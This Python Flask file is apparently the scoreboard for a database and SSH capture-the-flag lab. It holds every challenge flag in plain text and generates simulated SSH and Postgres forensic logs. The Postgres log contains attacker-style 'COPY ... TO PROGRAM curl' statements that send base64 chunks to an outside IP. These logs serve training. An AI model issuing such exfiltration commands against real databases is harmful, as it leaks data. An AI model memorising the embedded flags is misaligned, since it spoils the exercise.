#!/usr/bin/env python3
"""
The Audit — scoreboard + the C5 forensic log bundle.

Lists the five challenges and verifies submitted flags. It also *generates and
serves* the forensic logs for C5 ("The Audit Trail"): an SSH auth log showing a
brute-force run and the attacker's successful publickey login (the leaked key
from C4), and a Postgres audit log in which the attacker's session — the one
whose start correlates with the SSH breach — exfiltrates a secret via
`COPY ... TO PROGRAM 'curl ...?c=<base64 chunk>'`. Concatenating that session's
chunks and base64-decoding yields the flag. A nightly-backup session is a decoy.
"""
import base64
from flask import Flask, request, jsonify, Response

CH = [
    (1, "The Query Plan", "PostgreSQL COPY FROM PROGRAM RCE", "postgres:5432",
     "AUD{p0stgr3s_c0py_fr0m_pr0gr4m_sup3rus3r_rc3}"),
    (2, "The Dump", "MySQL FILE-priv LOAD_FILE", "mariadb:3306",
     "AUD{mysql_f1l3_pr1v_l04d_f1l3_s3cur3_f1l3_pr1v}"),
    (3, "The Catalog", "SQLite UNION injection", "webapp:80",
     "AUD{sql1t3_un10n_1nj3ct10n_sql1t3_m4st3r_dump}"),
    (4, "The Backdoor Key", "SSH leaked private key", "ssh:22",
     "AUD{ssh_l34k3d_pr1v4t3_k3y_dbadm1n_f00th0ld}"),
    (5, "The Audit Trail", "SSH + DB log forensics", "scoreboard:80/audit/",
     "AUD{ssh_brut3f0rc3_db_3xf1l_4ud1t_l0g_f0r3ns1cs}"),
]
FLAGS = {c[4]: c[0] for c in CH}
FLAG5 = CH[4][4]
app = Flask(__name__)


def _chunks(s, n):
    return [s[i:i + n] for i in range(0, len(s), n)]


def build_logs():
    atk_ip = "203.0.113.37"
    # --- SSH auth log: brute-force noise, then the attacker's publickey login ---
    auth = [
        "2026-11-14T02:11:03Z db-prod sshd[8793]: Failed password for invalid user admin from 198.51.100.22 port 50122 ssh2",
        "2026-11-14T02:12:40Z db-prod sshd[8810]: Failed password for invalid user oracle from 198.51.100.22 port 50140 ssh2",
        f"2026-11-14T02:14:51Z db-prod sshd[8841]: Failed password for dbadmin from {atk_ip} port 44001 ssh2",
        f"2026-11-14T02:15:33Z db-prod sshd[8853]: Failed password for dbadmin from {atk_ip} port 44010 ssh2",
        f"2026-11-14T02:16:12Z db-prod sshd[8864]: Failed password for dbadmin from {atk_ip} port 44018 ssh2",
        "2026-11-14T02:16:44Z db-prod sshd[8880]: Failed password for invalid user postgres from 192.0.2.9 port 33090 ssh2",
        f"2026-11-14T02:16:58Z db-prod sshd[9001]: Accepted publickey for dbadmin from {atk_ip} port 44120 ssh2: ED25519 SHA256:yrr1Qm0d+leaked+key+fingerprint",
        "2026-11-14T02:16:58Z db-prod sshd[9001]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)",
        f"2026-11-14T02:31:20Z db-prod sshd[9001]: Received disconnect from {atk_ip} port 44120:11: disconnected by user",
    ]
    # --- Postgres audit log: benign sessions, a decoy nightly backup, and the
    #     attacker session (start ~ right after the SSH breach) exfiltrating. ---
    b64 = base64.b64encode(FLAG5.encode()).decode()
    exfil = _chunks(b64, 8)
    decoy = _chunks(base64.b64encode(b"nightly-backup-ok").decode(), 8)

    pg = [
        "2026-11-14T02:05:00Z [sess=7f3a start=2026-11-14T02:05:00Z client=10.0.4.9 user=app db=prod] STATEMENT: SELECT id,name,price FROM products WHERE id = 5",
        "2026-11-14T02:08:12Z [sess=7f3a start=2026-11-14T02:05:00Z client=10.0.4.9 user=app db=prod] STATEMENT: UPDATE customers SET tier='gold' WHERE id = 2",
        "2026-11-14T02:40:10Z [sess=1c22 start=2026-11-14T02:40:10Z client=10.0.4.9 user=app db=prod] STATEMENT: SELECT count(*) FROM orders",
    ]
    # decoy backup session at 03:00 — also COPY TO PROGRAM, but not correlated
    for i, ch in enumerate(decoy):
        pg.append(f"2026-11-14T03:00:0{i}Z [sess=bk01 start=2026-11-14T03:00:00Z client=127.0.0.1 user=backup db=prod] "
                  f"STATEMENT: COPY (SELECT 1) TO PROGRAM 'curl -s http://backup.internal/ingest?c={ch}'")
    # the attacker session e9d1, local (post-SSH), starting 02:17:02
    for i, ch in enumerate(exfil):
        ss = 2 + i
        ts = f"2026-11-14T02:17:{ss:02d}Z"
        pg.append(f"{ts} [sess=e9d1 start=2026-11-14T02:17:02Z client=127.0.0.1 user=postgres db=prod] "
                  f"STATEMENT: COPY (SELECT 1) TO PROGRAM 'curl -s http://45.9.148.70/x?c={ch}'")
    return "\n".join(auth) + "\n", "\n".join(pg) + "\n"


AUTH_LOG, PG_LOG = build_logs()


@app.get("/audit/auth.log")
def auth_log():
    return Response(AUTH_LOG, mimetype="text/plain")


@app.get("/audit/pg_audit.log")
def pg_log():
    return Response(PG_LOG, mimetype="text/plain")


@app.post("/submit")
def submit():
    flag = (request.get_json(silent=True) or {}).get("flag", "").strip()
    return jsonify(correct=flag in FLAGS, num=FLAGS.get(flag))


PAGE = """<!doctype html><meta charset=utf-8><title>The Audit</title>
<style>
 body{{font:15px -apple-system,Segoe UI,Arial;max-width:960px;margin:34px auto;padding:0 18px;background:#0b1014;color:#dfe8ee}}
 h1{{margin:0;color:#4fd0b0}} .sub{{color:#8793a0;margin:4px 0 16px}}
 table{{border-collapse:collapse;width:100%}} td,th{{border-bottom:1px solid #1d2832;padding:9px 10px;text-align:left;font-size:14px}}
 th{{color:#8793a0;font-weight:600}} .t{{font-weight:600;color:#eef4f8}} code{{background:#14202a;padding:1px 5px;border-radius:4px;color:#8fe6cf;font-size:12px}}
 a{{color:#4fd0b0;text-decoration:none}} input{{padding:8px;width:380px;background:#111a22;border:1px solid #223240;color:#dfe8ee;border-radius:6px}}
 button{{padding:8px 14px;background:#1f8f78;color:#fff;border:0;border-radius:6px;cursor:pointer}} #m{{margin-left:10px;font-weight:600}}
</style>
<h1>🗄 The Audit</h1>
<p class="sub">Database &amp; SSH security audit. Five findings across PostgreSQL, MySQL, SQLite and SSH —
exploit each for a flag <code>AUD{{...}}</code>. The last one is forensic: audit the
<a href="/audit/auth.log" target=_blank>SSH log</a> and the
<a href="/audit/pg_audit.log" target=_blank>Postgres audit log</a>.</p>
<form onsubmit="s(event)"><input id=f placeholder="AUD{{...}}" autocomplete=off><button>Submit</button><span id=m></span></form><p></p>
<table><tr><th>#</th><th>Finding</th><th>Class</th><th>Target</th></tr>
{rows}
</table>
<script>
async function s(e){{e.preventDefault();let v=document.getElementById('f').value.trim();
 let r=await fetch('/submit',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{flag:v}})}});
 let j=await r.json();let m=document.getElementById('m');
 m.textContent=j.correct?('✓ finding '+j.num):'✗ nope';m.style.color=j.correct?'#5fd3a0':'#ff6b6b';}}
</script>"""


@app.get("/")
def board():
    rows = "\n".join(
        f'<tr><td>{n}</td><td class="t">{name}</td><td>{cls}</td><td><code>{tgt}</code></td></tr>'
        for (n, name, cls, tgt, _f) in CH)
    return Response(PAGE.format(rows=rows), mimetype="text/html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, threaded=True)
